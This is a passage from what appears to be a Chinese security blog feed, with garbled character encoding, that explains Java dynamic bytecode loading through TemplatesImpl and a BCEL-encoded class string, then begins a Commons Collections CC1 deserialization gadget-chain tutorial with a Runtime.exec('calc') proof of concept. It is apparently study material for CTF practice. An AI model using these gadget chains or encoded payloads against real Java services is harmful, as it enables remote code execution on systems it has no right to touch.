com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloTemplatesImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <br><span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloTemplatesImpl</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        System.out.println(<span class="hljs-string">&quot;Hello TemplatesImpl&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ƒç»§æ‰¿äº† <code>AbstractTranslet</code> ç±»ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°é‡Œæ’å…¥<code>Hello</code>çš„è¾“å‡ºã€‚</p><p>å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ï¼Œå³å¯è¢« <code>TemplatesImpl</code> æ‰§è¡Œäº†ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005336767.png" alt="image-20240730005336767"></p><h2 id="åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç "><a href="#åˆ©ç”¨BCEL-ClassLoaderåŠ è½½å­—èŠ‚ç " class="headerlink" title="åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç "></a>åˆ©ç”¨BCEL ClassLoaderåŠ è½½å­—èŠ‚ç </h2><p>è‹¥æˆ‘ä»¬è®¤ä¸ºæ‰€æœ‰èƒ½å¤Ÿæ¢å¤æˆä¸€ä¸ªç±»å¹¶åœ¨JVMè™šæ‹Ÿæœºé‡ŒåŠ è½½çš„å­—èŠ‚åºåˆ—éƒ½åœ¨æˆ‘ä»¬çš„æ¢è®¨èŒƒå›´å†…ã€‚ </p><p>é‚£ä¹ˆï¼Œ<strong>BCELå­—èŠ‚ç </strong>ä¹Ÿå¿…ç„¶åœ¨æˆ‘ä»¬çš„è®¨è®ºèŒƒå›´å†…ï¼Œä¸”å æ®ç€æ¯”è¾ƒé‡è¦çš„åœ°ä½ã€‚ </p><p><code>BCEL</code>çš„å…¨ååº”è¯¥æ˜¯<code>Apache Commons BCEL</code>ï¼Œå±äº<code>Apache Commons</code>é¡¹ç›®ä¸‹çš„ä¸€ä¸ªå­é¡¹ç›®ï¼Œ</p><p>ä½†å…¶å› ä¸ºè¢«<code>Apache Xalan</code>æ‰€ä½¿ç”¨ï¼Œè€Œ<code>Apache Xalan</code>åˆæ˜¯Javaå†…éƒ¨å¯¹äºJAXPçš„å®ç°ï¼Œæ‰€ä»¥BCELä¹Ÿè¢«åŒ…å«åœ¨äº†JDKçš„åŸç”Ÿåº“ä¸­ã€‚ </p><p>å…³äºBCELçš„è¯¦ç»†ä»‹ç»ï¼Œè¯·é˜…è¯»pç‰›å†™çš„å¦ä¸€ç¯‡æ–‡ç« ã€Š<a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader</a>å»å“ªäº†ã€‹ï¼Œå»ºè®®é˜…è¯»å®Œè¿™ç¯‡æ–‡ç« å†æ¥é˜…è¯»ã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡BCELæä¾›çš„ä¸¤ä¸ªç±»<code>Repository</code>å’Œ<code>Utility</code>æ¥åˆ©ç”¨ï¼š</p><p><code>Repository</code>ç”¨äºå°†ä¸€ä¸ª<code>Java Class</code>å…ˆè½¬æ¢æˆåŸç”Ÿå­—èŠ‚ç ï¼Œå½“ç„¶è¿™é‡Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨<code>javac</code>å‘½ä»¤æ¥ç¼–è¯‘javaæ–‡ä»¶ç”Ÿæˆå­—èŠ‚ç ï¼›</p><p><code>Utility</code>ç”¨äºå°†åŸç”Ÿçš„å­—èŠ‚ç è½¬æ¢æˆBCELæ ¼å¼çš„å­—èŠ‚ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730005943078.png" alt="image-20240730005943078"></p><p>å‰é¢åŠ ä¸ª<code>$$BCEL$$</code>æ ‡è¯†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;<br><span class="hljs-keyword">import</span> com.sun.org.apache.bcel.internal.Repository;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloBCEL</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String []args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//encode();</span><br>        decode();<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">encode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(evil.Hello.class);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<br>        System.out.println(code);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">decode</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>().loadClass<br>                (<span class="hljs-string">&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQMK$c3$40$Q$7d$db$af41$b5$b5$b5$f5$5b$5bOU$c4$5c$E$P$V$_$82x$I$wT$ea$c1$d3$b6$5d$ea$96M$oiZ$f0g$e9A$c1$83$3f$c0$l$r$cen$LA$e8$k$e61of$de$be$d9$fd$f9$fd$fa$Gp$86C$H$F$ac$db$a8$a3Q$c4$86$83MlY$d8$b6$b0$c3P$b8$90$a1L$$$Z$b2$ed$a3$kC$ee$w$g$K$86$b2$_Cq$3b$N$fa$o$7e$e0$7dEL$d5$8f$G$5c$f5x$yu$be$ms$c9$b3$9c0$b8$be$98I$e5$dd$I$a5$a2$O$b1$B$97$nC$a3$fd$e4$8f$f9$8c$7b$8a$87$p$af$9b$c42$iu$cc$j$3c$k$d1T&quot;</span> +                <span class="hljs-string">&quot;mI$99$c1$e9F$d3x$m$ae$a5$d6w$8c$e4$a9nsa$a1ha$d7$c5$k$f6$ZJ$a6r$d2$7c$8cb5lY8p$d1D$8b$sR$t$&quot;</span> +              <span class="hljs-string">&quot;M$95T$ff$ae$3f$W$83$e4$l$d5$7d$9d$q$o$a0$c5$a3$v$V$eas32$f2$ee$c9IB$7e$E$P$c8Om$J$cd$60$bd$e8L$d1$96$f5$f6$b2$r$d1B$9e$9e$5c$9f$M$98$b6N$d1$a6$cc$pd$84$f9$e3O$b07Sv$u$W$M$99&quot;</span> +          <span class="hljs-string">&quot;$c5$KEw$de$40X$o$b4$b1$8a$f2b$f8$dc$88$R$f7$8eL5$fb$81$5c$w$e0$Q$ea$a1$oI$a5$o6$wX$p$a4$ef3$9d&quot;</span> + <span class="hljs-string">&quot;$b5$3f3$dbS$w$S$C$A$A&quot;</span>).newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011732779.png" alt="image-20240730011732779"></p><p><code>BCEL ClassLoader</code>åœ¨<code>Fastjson</code>ç­‰æ¼æ´çš„åˆ©ç”¨é“¾æ„é€ æ—¶éƒ½æœ‰è¢«ç”¨åˆ°ï¼Œå…¶å®è¿™ä¸ªç±»å’Œå‰é¢çš„ <code>TemplatesImpl</code> éƒ½å‡ºè‡ªäºåŒä¸€ä¸ªç¬¬ä¸‰æ–¹åº“ï¼Œ<code>Apache Xalan</code>ã€‚</p><p>ä½†æ˜¯ç”±äºå„ç§åŸå› ï¼ˆè¯¦è§å‰é¢æ‰€è¯´çš„ ã€ŠBCEL ClassLoader å»å“ªäº†ã€‹ï¼‰ï¼Œåœ¨<strong>Java <code>8u251</code>çš„æ›´æ–°ä¸­ï¼Œè¿™ä¸ªClassLoaderè¢«ç§»é™¤äº†</strong>ï¼Œæ‰€ä»¥æˆ‘JDK8u401çš„ç‰ˆæœ¬æ˜¯ä¼šæŠ¥é”™çš„ï¼š</p><p><img src="/2024/07/29/JavaWeb-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/image-20240730011841209.png" alt="image-20240730011841209"></p><p>ä½†æ˜¯è¿™ç§ä½¿ç”¨<code>Repository.lookupClass()</code>çš„æ–¹æ³•å¾ˆå¸¸ç”¨ï¼Œç»å¸¸ç”¨äºæ‰“å…¥æ¶æ„å­—èŠ‚ç ï¼Œåç»­é‡åˆ°å…·ä½“é¢˜ç›®çš„æ—¶å€™å°±çŸ¥é“äº†ã€‚æ‰“å¤ç°çš„æ—¶å€™è¿™å‡ ä¸ªåŠ è½½å­—èŠ‚ç çš„æ–¹å¼éƒ½å¯èƒ½ä¼šå‡ºç°ã€‚</p><p>å‚è€ƒï¼š</p><p>pç‰›-Javaå®‰å…¨æ¼«è°ˆ - 13.Javaä¸­åŠ¨æ€åŠ è½½å­—èŠ‚ç çš„é‚£äº›æ–¹æ³•</p><p><a href="https://wx.zsxq.com/dweb2/index/tags/Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/551511412514">çŸ¥è¯†æ˜Ÿçƒ | æ·±åº¦è¿æ¥é“æ†ç²‰ä¸ï¼Œè¿è¥é«˜å“è´¨ç¤¾ç¾¤ï¼ŒçŸ¥è¯†å˜ç°çš„å·¥å…· (zsxq.com)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Commons Collections</title>
    <link href="/2024/07/28/Commons-Collections/"/>
    <url>/2024/07/28/Commons-Collections/</url>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å½“åˆå­¦Javaååºåˆ—åŒ–æœ€å…ˆé‡åˆ°çš„ï¼Œè¿™ä¹Ÿæ˜¯ç»•ä¸å¼€çš„ä¸œè¥¿ã€‚è™½ç„¶ç°åœ¨å¯¹äºå¾ˆå¤šJavaååºåˆ—åŒ–é¢˜å·²ç»ä¸èƒ½ç›´æ¥å¥—ç”¨CCé“¾é€Ÿé€šï¼Œä½†æ˜¯å¾ˆå¤šç¼åˆæ€ªè°ƒè¯•åˆ°æœ€åä¸€æ­¥è¿˜æ˜¯é‡‡ç”¨çš„CCé“¾éƒ¨åˆ†ï¼Œå› ä¸ºåŸç”Ÿååºåˆ—åŒ–è‚¯å®šæ˜¯å¾ˆå¥½ç”¨çš„ã€‚</p><p>é¦–å…ˆç®€å•ä»‹ç»ä¸€ä¸‹å‡ ä¸ªå…³é”®è¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">å¯¹äºåˆ©ç”¨é“¾ä¸Šçš„ç±»ï¼Œéƒ½éœ€è¦å®ç°Serializableæ¥å£ã€æˆ–ç»§æ‰¿è¯¥æ¥å£çš„å®ç°ç±»<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Sourceï¼šå…¥å£ç±»ï¼ˆé‡å†™readObjectè°ƒç”¨å¸¸è§æ–¹æ³•ï¼Œå‚æ•°ç±»å‹å®½æ³›ï¼Œæœ€å¥½jdkè‡ªå¸¦ï¼‰<br>Gadget Chainï¼šè°ƒç”¨é“¾ï¼ˆç›¸åŒæ–¹æ³•åã€ç›¸åŒå‚æ•°ç±»å‹ã€ä¸åŒè°ƒç”¨è¿‡ç¨‹ï¼‰<br>Sinkï¼šæ‰§è¡Œç±»ï¼ˆRCEã€SSRFã€å†™æ–‡ä»¶...ï¼‰<br></code></pre></td></tr></table></figure><p>å¸¸è§æ–¹æ³•ï¼š<code>toString</code>ã€<code>hashCode</code>ã€<code>equals</code></p><p>åœ¨åé¢çš„CCé“¾ä¸­ç»å¸¸çœ‹åˆ°<code>HashMap</code>ä½œä¸ºå…¥å£ç±»ï¼Œå®ƒå®ç°äº†<code>Serializable</code>æ¥å£ä¸”ä½œä¸ºjdkè‡ªå¸¦çš„ç±»ï¼Œ<code>readObject</code>ä¸­è°ƒç”¨äº†å¸¸è§æ–¹æ³•<code>hashCode</code>ï¼Œæ˜¯ä¸é”™çš„å…¥å£ç±»ã€‚</p><p>ä¸¥æ ¼æ¥è¯´åº”è¯¥ä»URLDNSå¼€å§‹å†™ï¼Œä½†æ˜¯åŸç†ä¹Ÿå¾ˆç®€å•å¾ˆæ˜“æ‡‚ï¼Œåªæ¶‰åŠURLç±»é‡Œhashcodeé‡Œçš„ç®€å•æ“ä½œè§¦å‘è®¿é—®DNSï¼ˆå…¶å®æ˜¯æˆ‘æ‡’ï¼‰ï¼Œå°±ä¸å†™äº†ã€‚</p><p>è¯ä¸å¤šè¯´ï¼Œç›´æ¥å›åˆ°æˆ‘ä»¬æ¢¦å¼€å§‹çš„åœ°æ–¹-<strong>Commons Collections</strong>ã€‚</p><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>CC1å…¶å®ç”¨çš„ä¸å¤šï¼ŒCCé“¾é‡Œç”¨å¾—é¢‘ç¹çš„å…¶å®æ˜¯CC3ï¼ˆæ¶æ„å­—èŠ‚ç ï¼‰ã€CC6ä»¥åŠCC4ï¼Œè¿˜æœ‰å¾ˆå°‘è§çš„CC2ï¼ŒCC1å…¶å®å°±æ˜¯èµ·åˆ°ä¸€ä¸ªå¼•å…¥å­¦ä¹ çš„ä½œç”¨ã€‚</p><p>é¦–å…ˆä¾èµ–å°±ç›´æ¥</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œæˆ‘ç”¨çš„æ˜¯<code>Jdk8u401</code>ã€‚</p><p>è¿™å‡ ä¸ªMapéƒ½å°¤ä¸ºç»å…¸ï¼Œéœ€è¦æ·±å…¥å­¦ä¹ ã€‚</p><p><strong>Transformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Transformer</span> &#123;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>Transformer</code>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œå¯ä»¥æ¥å—ä»»æ„ä¸€ä¸ª<code>Object</code>ç±»å‹çš„å‚æ•°ä¼ å…¥ã€‚è¿™ä¸ªæ¥å£æœ‰å‡ ä¸ªé‡è¦çš„Mapå®ç°ç±»ï¼Œè€Œä¸”å®ƒä»¬éƒ½å®ç°äº†<code>Serializable</code>æ¥å£ã€‚</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object iConstant;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ<code>ConstantTransformer</code>è°ƒç”¨<code>transform()</code>æ–¹æ³•è¿”å›æ„é€ æ—¶ä¼ å…¥çš„å¯¹è±¡</p><p>å†™ä¸€å †ç©æ„å…¶å®å°±æ˜¯ä¼ å…¥ä¼ å‡ºä¸€ä¸ªå¯¹è±¡ï¼Œå‰åä¸å˜ã€‚</p><p><strong>InvokerTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InvokerTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125; <span class="hljs-comment">// catch ....</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå°±æ¯”è¾ƒå…³é”®äº†ï¼Œæ˜¯ååºåˆ—åŒ–åˆ©ç”¨çš„å¸¸å®¢ã€‚å› ä¸ºå®ƒè¿™é‡Œçš„invokeå¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•ã€‚</p><ul><li>iMethodName å¾…æ‰§è¡Œçš„æ–¹æ³•å</li><li>iParamTypes å¾…æ‰§è¡Œæ–¹æ³•çš„å‚æ•°åˆ—è¡¨çš„å‚æ•°ç±»å‹</li><li>iArgs å¾…æ‰§è¡Œæ–¹æ³•çš„å‚æ•°åˆ—è¡¨</li></ul><p>è°ƒç”¨<code>transform</code>çš„æ—¶å€™ä¼šæ‰§è¡Œinputå¯¹è±¡çš„iMethodNameæ–¹æ³•ã€‚</p><p><strong>ChainedTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Transformer</span>, Serializable &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object object)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†™ä¸€å †ï¼Œå…¶å®å°±æ˜¯æŠŠå¤šä¸ª<code>Transformer</code>ä¸²æˆä¸€æ¡é“¾å­ï¼Œå‰ä¸€ä¸ªè°ƒç”¨è¿”å›çš„ç»“æœä½œä¸ºåä¸€ä¸ªè°ƒç”¨çš„å‚æ•°ã€‚</p><p><strong>TransformedMap</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformedMap</span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-built_in">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-built_in">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> Object <span class="hljs-title function_">checkSetValue</span><span class="hljs-params">(Object value)</span> &#123;<br>        <span class="hljs-keyword">return</span> valueTransformer.transform(value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>TransformedMap</code>ç”¨äºå¯¹JavaåŸç”ŸMapè¿›è¡Œä¸€äº›ä¿®é¥°ï¼Œå½“Mapè°ƒç”¨<code>setValue</code>æ—¶ï¼Œä¼šè§¦å‘<code>checkSetValue</code>ï¼Œè¿›è€Œè°ƒç”¨<code>transform</code>ã€‚å…¶æ„é€ æ–¹æ³•è¢«<code>protected</code>ä¿®é¥°ï¼Œå› æ­¤æˆ‘ä»¬åˆ©ç”¨å®ƒçš„é™æ€publicæ–¹æ³•<code>decorate</code></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>é¦–å…ˆæˆ‘ä»¬æƒ³åˆ°çš„æ˜¯ä½¿ç”¨<code>Transformer</code>çš„å®ç°ç±»å’Œ<code>TransformedMap</code>å®ç°å‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.getRuntime()),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>&#125;;<br><span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>Map&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashedMap</span>();<br>Map&lt;Object, Object&gt; evilMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, chainedTransformer);<br>evilMap.put(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-number">114514</span>);<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™é‡Œæœ‰ä¿©é—®é¢˜ï¼š</p><ul><li>Runtimeç±»æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•ååºåˆ—åŒ–</li><li>éœ€è¦æ‰¾åˆ°<code>readObject</code>ä¸­æœ‰ç±»ä¼¼<code>Map.put(xxx,yyy)</code>æ“ä½œçš„ç±»</li></ul><p>å¯¹äºé—®é¢˜ä¸€ï¼Œ<code>Class</code>ç±»å¯ä»¥ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨<code>Runtime.class</code>ä½œä¸º<code>ChainedTransformer</code>çš„å…¥å£å‚æ•°ï¼Œåé¢å†é€šè¿‡åå°„æ¥è°ƒç”¨exec</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 